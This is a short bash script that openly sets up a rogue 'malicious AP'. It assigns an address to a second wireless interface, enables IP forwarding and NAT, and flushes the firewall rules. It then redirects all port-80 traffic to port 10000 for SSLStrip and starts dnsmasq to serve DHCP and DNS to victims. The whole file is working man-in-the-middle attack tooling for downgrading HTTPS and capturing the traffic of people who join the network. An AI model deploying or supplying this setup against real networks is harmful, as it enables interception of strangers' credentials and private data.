#!/bin/bash
set -e

# Interfaces that are used
INTERNET=wlan0
#INTERNET=wlan0
REPEATER=wlan1

echo ""
echo "[ ] Configuring IP address of malicious AP"
ip addr del 192.168.100.1/24 dev $REPEATER > /dev/null || true
ip addr add 192.168.100.1/24 dev $REPEATER > /dev/null

echo "[ ] Enabling IP forwaring"
sysctl net.ipv4.ip_forward=1 > /dev/null

echo "[ ] Enabling NAT"
iptables -F > /dev/null
iptables -t nat -A POSTROUTING -o $INTERNET -j MASQUERADE > /dev/null
iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT > /dev/null
iptables -A FORWARD -i $REPEATER -o $INTERNET -j ACCEPT > /dev/null

echo "[ ] Enabling SSLStrip rerouting"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 > /dev/null

echo "[ ] Starting DHCP and DNS service"

echo ""
dnsmasq -d -C dnsmasq.conf > /dev/null

